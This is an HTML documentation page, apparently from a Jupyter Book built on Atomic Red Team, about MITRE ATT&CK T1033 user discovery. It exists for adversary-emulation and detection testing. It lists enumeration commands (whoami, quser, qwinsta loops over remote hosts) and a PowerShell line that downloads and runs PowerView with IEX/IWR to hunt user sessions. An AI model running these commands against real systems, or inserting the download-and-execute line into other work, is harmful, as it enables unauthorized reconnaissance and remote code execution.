@@ -1,0 +1,603 @@
+
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta charset="utf-8" />
+    <title>T1033 - System Owner/User Discovery &#8212; The Atomic Playbook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
+    <link href="../../_static/css/index.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../_static/sphinx-book-theme.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/jupyter-sphinx.css" />
+    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/sphinx-book-theme.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/language_data.js"></script>
+    <script src="../../_static/togglebutton.js"></script>
+    <script src="../../_static/clipboard.min.js"></script>
+    <script src="../../_static/copybutton.js"></script>
+    <script src="../../_static/mystnb.js"></script>
+    <script src="../../_static/sphinx-book-theme.js"></script>
+    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
+    <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed-amd.js"></script>
+    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
+    <script >
+        const thebe_selector = ".thebe"
+        const thebe_selector_input = "pre"
+        const thebe_selector_output = ".output"
+    </script>
+    <script async="async" src="../../_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="T1087.002 - Account Discovery: Domain Account" href="T1087.002.html" />
+    <link rel="prev" title="T1049 - System Network Connections Discovery" href="T1049.html" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="docsearch:language" content="en">
+
+
+
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+<a class="navbar-brand text-wrap" href="../../index.html">
+  
+  <img src="../../_static/logo.png" class="logo" alt="logo">
+  
+  
+  <h1 class="site-logo" id="site-title">The Atomic Playbook</h1>
+  
+</a>
+</div>
+
+<form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form>
+
+<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
+  <ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../intro.html">
+   Welcome to the Atomic Playbook
+  </a>
+ </li>
+</ul>
+<ul class="current nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../initial-access.html">
+   Initial Access
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../execution.html">
+   Execution
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../persistence.html">
+   Persistence
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../privilege-escalation.html">
+   Privilege Escalation
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../defense-evasion.html">
+   Defense Evasion
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../credential-access.html">
+   Credential Access
+  </a>
+ </li>
+ <li class="toctree-l1 current active">
+  <a class="reference internal" href="../discovery.html">
+   Discovery
+  </a>
+  <ul class="current">
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1135.html">
+     T1135 - Network Share Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1049.html">
+     T1049 - System Network Connections Discovery
+    </a>
+   </li>
+   <li class="toctree-l2 current active">
+    <a class="current reference internal" href="#">
+     T1033 - System Owner/User Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1087.002.html">
+     T1087.002 - Account Discovery: Domain Account
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1526.html">
+     T1526 - Cloud Service Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1497.002.html">
+     T1497.002 - User Activity Based Checks
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1087.004.html">
+     T1087.004 - Cloud Account
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1069.002.html">
+     T1069.002 - Permission Groups Discovery: Domain Groups
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1069.html">
+     T1069 - Permission Groups Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1016.html">
+     T1016 - System Network Configuration Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1482.html">
+     T1482 - Domain Trust Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1087.003.html">
+     T1087.003 - Email Account
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1518.html">
+     T1518 - Software Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1087.001.html">
+     T1087.001 - Account Discovery: Local Account
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1497.003.html">
+     T1497.003 - Time Based Evasion
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1538.html">
+     T1538 - Cloud Service Dashboard
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1010.html">
+     T1010 - Application Window Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1069.003.html">
+     T1069.003 - Cloud Groups
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1012.html">
+     T1012 - Query Registry
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1057.html">
+     T1057 - Process Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1069.001.html">
+     T1069.001 - Permission Groups Discovery: Local Groups
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1217.html">
+     T1217 - Browser Bookmark Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1497.001.html">
+     T1497.001 - System Checks
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1518.001.html">
+     T1518.001 - Software Discovery: Security Software Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1082.html">
+     T1082 - System Information Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1007.html">
+     T1007 - System Service Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1040.html">
+     T1040 - Network Sniffing
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1018.html">
+     T1018 - Remote System Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1046.html">
+     T1046 - Network Service Scanning
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1497.html">
+     T1497 - Virtualization/Sandbox Evasion
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1201.html">
+     T1201 - Password Policy Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1124.html">
+     T1124 - System Time Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1083.html">
+     T1083 - File and Directory Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1087.html">
+     T1087 - Account Discovery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1120.html">
+     T1120 - Peripheral Device Discovery
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../lateral-movement.html">
+   Lateral Movement
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../collection.html">
+   Collection
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../command-and-control.html">
+   Command and Control
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../exfiltration.html">
+   Exfiltration
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../impact.html">
+   Impact
+  </a>
+ </li>
+</ul>
+
+</nav>
+
+ <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="row topbar fixed-top container-xl">
+    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
+    </div>
+    <div class="col pl-2 topbar-main">
+        
+        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+            <i class="fas fa-bars"></i>
+            <i class="fas fa-arrow-left"></i>
+            <i class="fas fa-arrow-up"></i>
+        </button>
+        
+        <div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="../../_sources/tactics/discovery/T1033.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.ipynb</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+    
+</div>
+        <!-- Source interaction buttons -->
+
+
+        <!-- Full screen (wrap in <a> to have style consistency -->
+        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
+                    class="fas fa-expand"></i></button></a>
+
+        <!-- Launch buttons -->
+
+    </div>
+
+    <!-- Table of contents -->
+    <div class="d-none d-md-block col-md-2 bd-toc show">
+        <div class="tocsection onthispage pt-5 pb-3">
+            <i class="fas fa-list"></i> Contents
+        </div>
+        <nav id="bd-toc-nav">
+            <ul class="nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#atomic-tests">
+   Atomic Tests
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-1-system-owner-user-discovery">
+     Atomic Test #1 - System Owner/User Discovery
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-2-system-owner-user-discovery">
+     Atomic Test #2 - System Owner/User Discovery
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-sh">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         sh
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-3-find-computers-where-user-has-session-stealth-mode-powerview">
+     Atomic Test #3 - Find computers where user has session - Stealth mode (PowerView)
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#detection">
+   Detection
+  </a>
+ </li>
+</ul>
+
+        </nav>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+        
+              <div>
+                
+  <div class="section" id="t1033-system-owner-user-discovery">
+<h1>T1033 - System Owner/User Discovery<a class="headerlink" href="#t1033-system-owner-user-discovery" title="Permalink to this headline">¶</a></h1>
+<p>Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using <a class="reference external" href="https://attack.mitre.org/techniques/T1003">OS Credential Dumping</a>. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from <a class="reference external" href="https://attack.mitre.org/techniques/T1033">System Owner/User Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.</p>
+<p>Utilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.</p>
+<div class="section" id="atomic-tests">
+<h2>Atomic Tests<a class="headerlink" href="#atomic-tests" title="Permalink to this headline">¶</a></h2>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Import the Module before running the tests.</span>
+<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="mh">0x6c</span><span class="o">/</span><span class="n">AtomicRedTeam</span><span class="o">/</span><span class="n">atomics</span><span class="o">/</span><span class="n">invoke</span><span class="o">-</span><span class="n">atomicredteam</span><span class="o">/</span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicRedTeam</span><span class="o">.</span><span class="n">psd1</span> <span class="o">-</span> <span class="n">Force</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-1-system-owner-user-discovery">
+<h3>Atomic Test #1 - System Owner/User Discovery<a class="headerlink" href="#atomic-test-1-system-owner-user-discovery" title="Permalink to this headline">¶</a></h3>
+<p>Identify System owner or users on an endpoint.</p>
+<p>Upon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout.
+Additionally, two files will be written to disk - computers.txt and usernames.txt.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="attack-commands-run-with-command-prompt">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>cmd.exe /C whoami
+wmic useraccount get /ALL
+quser /SERVER:&quot;#{computer_name}&quot;
+quser
+qwinsta.exe /server:#{computer_name}
+qwinsta.exe
+for /F &quot;tokens=1,2&quot; %i in (&#39;qwinsta /server:#{computer_name} ^| findstr &quot;Active Disc&quot;&#39;) do @echo %i | find /v &quot;#&quot; | find /v &quot;console&quot; || echo %j &gt; usernames.txt
+@FOR /F %n in (computers.txt) DO @FOR /F &quot;tokens=1,2&quot; %i in (&#39;qwinsta /server:%n ^| findstr &quot;Active Disc&quot;&#39;) do @echo %i | find /v &quot;#&quot; | find /v &quot;console&quot; || echo %j &gt; usernames.txt
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1033</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-2-system-owner-user-discovery">
+<h3>Atomic Test #2 - System Owner/User Discovery<a class="headerlink" href="#atomic-test-2-system-owner-user-discovery" title="Permalink to this headline">¶</a></h3>
+<p>Identify System owner or users on an endpoint</p>
+<p>Upon successful execution, sh will stdout list of usernames.</p>
+<p><strong>Supported Platforms:</strong> linux, macos</p>
+<div class="section" id="attack-commands-run-with-sh">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#attack-commands-run-with-sh" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>users
+w
+who
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1033</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-3-find-computers-where-user-has-session-stealth-mode-powerview">
+<h3>Atomic Test #3 - Find computers where user has session - Stealth mode (PowerView)<a class="headerlink" href="#atomic-test-3-find-computers-where-user-has-session-stealth-mode-powerview" title="Permalink to this headline">¶</a></h3>
+<p>Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.
+<strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="attack-commands-run-with-powershell">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">IWR </span><span class="s1">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-UserHunter</span> <span class="n">-Stealth</span> <span class="n">-Verbose</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1033</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="detection">
+<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
+<p>System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.</p>
+<p>Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as <a class="reference external" href="https://attack.mitre.org/techniques/T1047">Windows Management Instrumentation</a> and <a class="reference external" href="https://attack.mitre.org/techniques/T1059/001">PowerShell</a>.</p>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: ".net-powershell"
+        },
+        kernelOptions: {
+            kernelName: ".net-powershell",
+            path: "./tactics/discovery"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = '.net-powershell'</script>
+
+              </div>
+              
+        </div>
+    </div>
+    
+    
+    <div class='prev-next-bottom'>
+        
+    <a class='left-prev' id="prev-link" href="T1049.html" title="previous page">T1049 - System Network Connections Discovery</a>
+    <a class='right-next' id="next-link" href="T1087.002.html" title="next page">T1087.002 - Account Discovery: Domain Account</a>
+
+    </div>
+    <footer class="footer mt-5 mt-md-0">
+    <div class="container">
+      <p>
+        
+          By Hare Sudhan Muthusamy<br/>
+        
+            &copy; Copyright 2020.<br/>
+      </p>
+    </div>
+  </footer>
+</main>
+
+
+      </div>
+    </div>
+
+    <script src="../../_static/js/index.js"></script>
+    
+  </body>
+</html>
